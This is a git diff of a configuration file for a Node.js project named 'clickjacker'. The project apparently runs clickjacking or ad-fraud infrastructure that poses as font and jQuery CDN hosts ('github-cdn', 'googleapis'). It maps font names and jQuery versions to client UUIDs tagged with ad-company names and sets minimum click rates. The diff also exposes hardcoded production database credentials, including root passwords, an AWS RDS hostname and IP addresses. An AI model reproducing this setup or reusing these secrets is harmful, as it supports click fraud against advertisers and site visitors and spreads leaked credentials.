@@ -1,29 +1,14 @@
 var config = {}
 
-//change depending on your dev setup or for production
-//var base_clickjacker_dir = "/Users/alfstad/Desktop/clickjacker";
-//var base_clickjacker_dir = "/home/troy/git/clickjacker";
-//var base_clickjacker_dir = "/c/Users/Troy/git/clickjacker";
 config.base_clickjacker_dir = '/var/www/github-cdn';
-
-config.port = process.env.WEB_PORT || 9000;
-// config.db_connection = {
-//     // host : 'localhost',
-//     user : 'root',
-//     password : 'derekisfat',
-//     database : 'domains_dev'
-// }; //actual ip = 54.187.184.91
 
 config.clientRequestPageloadWhitelistTimeWindowMillis = 5000;
 
 config.db_connection = {
-    // host : '54.149.38.119',
-    host: '52.24.23.177',
-    // host : 'localhost',
+    host: 'landerrs.cynwtdt18kyi.us-west-2.rds.amazonaws.com',
     user: 'root',
-    password: 'derekisfat',
-    // password : 'wewillwinintheend123!@#',
-    database: 'domains_dev',
+    password: 'Wewillrockyou1986!',
+    database: 'prod',
     multipleStatements: true
 };
 
@@ -32,13 +17,20 @@ config.port = '9001';
 config.uuidArr = [];
 config.uuidArr['Open Sans'] = '1f6c0823-6ffa-485f-b9ec-1b5df2ac267b'; //jake
 config.uuidArr['Martel Sans'] = 'a2ba5696-a37a-4d19-a266-96fd54517244'; //balling
+config.uuidArr['Source Sans Pro'] = '994c3823-aff6-f548-ce9b-1b5df2ac267c'; //adboom
+config.uuidArr['Nunito Sans'] = '73fev5s3-f694-4e77-88e5-74cd9b50obt2'; //quantm
+config.uuidArr['Roboto Condensed'] = '4127v5s3-f694-4djK-5412-74cd9b508YuL'; //Rob/AdsInc
 
+config.uuidJqueryArr = [];
+config.uuidJqueryArr['1.11.1'] = '1f6c0823-6ffa-485f-b9ec-1b5df2ac267b'; //z6m
+config.uuidJqueryArr['1.12.4'] = 'a2ba5696-a37a-4d19-a266-96fd54517244'; //balling/ads inc.
+config.uuidJqueryArr['3.0.0'] = '994c3823-aff6-f548-ce9b-1b5df2ac267c'; //adboom
+config.uuidJqueryArr['1.4.1'] = '73fev5s3-f694-4e77-88e5-74cd9b50obt2'; //quantm
+config.uuidJqueryArr['2.2.4'] = '4127v5s3-f694-4djK-5412-74cd9b508YuL'; //Rob/AdsInc
 
-// config.redirectUrl = "http://github.com";
 config.redirectUrls = [];
 config.redirectUrls['googleapis:'+config.port] = "https://fonts.google.com/";
 config.redirectUrls['github-cdn:'+config.port] = "https://github.com";
-
 
 config.minimum_clicks_per_min = 5;
 
